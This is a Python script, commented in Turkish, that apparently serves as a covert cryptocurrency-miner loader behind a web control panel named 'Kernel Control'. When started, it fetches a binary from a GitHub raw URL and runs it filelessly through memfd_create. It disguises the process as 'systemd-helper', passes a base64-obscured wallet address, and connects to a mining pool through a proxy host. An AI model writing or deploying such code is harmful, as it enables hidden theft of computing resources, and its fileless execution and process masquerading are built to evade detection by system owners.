#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
from urllib.parse import urlparse

libc = ctypes.CDLL('libc.so.6')
STATUS = {"running": False, "message": "Sistem Beklemede. Çekirdek henüz yüklenmedi."}
CF_WORKER_HOST = ""
# Cüzdan adresin
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def download_and_run_direct():
    global STATUS
    try:
        STATUS["message"] = "Çekirdek indiriliyor (Direct Binary)..."
        # Verdiğin yeni doğrudan link
        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
        
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            binary_content = response.read()

        STATUS["message"] = "Belleğe enjekte ediliyor..."
        
        # memfd_create: Tamamen fileless (disksiz) çalıştırma
        fd = libc.syscall(319, b"sys-kernel-core", 1)
        os.write(fd, binary_content)
        mem_path = f"/proc/self/fd/{fd}"

        set_process_name("systemd-helper")
        
        cmd = [
            mem_path, "-o", f"{CF_WORKER_HOST}:443", "-u", WALLET_ADDR,
            "-p", f"node-{int(time.time())%1000}", "--keepalive", "--tls",
            "--donate-level=1", "--cpu-max-threads-hint", "50"
        ]

        STATUS["running"] = True
        STATUS["message"] = "Sistem Aktif (Fileless & Direct Mode)"
        
        # Ortamı temizle ve çalıştır
        subprocess.run(cmd, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})

    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = f"Kritik Hata: {str(e)}"

class ControlPanel(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        
        # Buton mantığını HTML içinde garantiye alıyoruz
        action_html = ""
        if not STATUS["running"]:
            action_html = '<form action="/run" method="post"><button class="btn">SİSTEMİ KUR VE BAŞLAT</button></form>'
        else:
            action_html = '<div style="color: #0f0;">SİSTEM ŞU AN ÇALIŞIYOR</div>'

        html = f"""
        <html><head><title>Kernel Control</title><style>
            body {{ background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }}
            .container {{ border: 1px solid #1a1a1a; padding: 50px; display: inline-block; background: #0a0a0a; }}
            .btn {{ background: transparent; border: 1px solid #00ff00; color: #00ff00; padding: 15px 30px; cursor: pointer; font-size: 1.1em; }}
            .btn:hover {{ background: #00ff00; color: #000; }}
            .status-msg {{ margin: 25px; font-weight: bold; color: {"#0f0" if STATUS["running"] else "#f00"}; }}
        </style></head><body>
            <div class="container">
                <h1>KERNEL CONTROL UNIT</h1>
                <div class="status-msg">DURUM: {STATUS['message']}</div>
                {action_html}
            </div>
            <script>setTimeout(()=>{{ if(!window.location.hash) location.reload(); }}, 10000);</script>
        </body></html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        if self.path == "/run":
            if not STATUS["running"]:
                threading.Thread(target=download_and_run_direct, daemon=True).start()
            self.send_response(303)
            self.send_header("Location", "/#started")
            self.end_headers()

def run():
    # URL ayıklama (GitHub'daki 'url' dosyasından gelen PROXY_URL)
    raw_url = os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url)
    global CF_WORKER_HOST
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
    
    port = int(os.environ.get("PORT", 8080))
    http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlPanel).serve_forever()

if __name__ == "__main__":
    run()
